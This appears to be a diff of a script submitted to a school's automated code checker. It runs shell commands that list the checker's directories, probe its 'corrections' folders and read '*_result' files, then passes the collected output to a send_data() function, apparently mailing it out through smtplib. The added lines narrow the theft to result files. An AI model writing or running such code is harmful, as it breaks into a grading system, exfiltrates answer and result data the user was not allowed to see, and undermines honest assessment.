@@ -32,11 +32,11 @@ def get_data(command):
 # my_data += get_data("pwd")
 # my_data = get_data("cat ../../../../hbtn_checker_functions") or "f"
         ##########
-my_data = get_data("ls -laR  ../../../") or ""
+# my_data = get_data("ls -laR  ../../../") or ""
         #######
 # my_data += get_data("pwd ../../../../") or ""
 # my_data += get_data("ls -al ../../../../corrections_*/") or ""
-my_data += "\n#######################\n"
+my_data = "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or ""
@@ -50,8 +50,11 @@ my_data += "\n#######################\n"
 # my_data += get_data("ls -l ../../../corrections_*/corrections/2184/20259") or ""
 my_data += "\n#######################\n"
 my_data += get_data("pwd") or ""
+my_data += get_data("ls") or ""
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
-# my_data += get_data("cat ./cycle") or ""
+my_data += "\n#######################\n"
+my_data += get_data("cat *_result") or ""
+my_data += "\n#######################\n"
 send_data(my_data)
 ##############################################################
 import smtplib
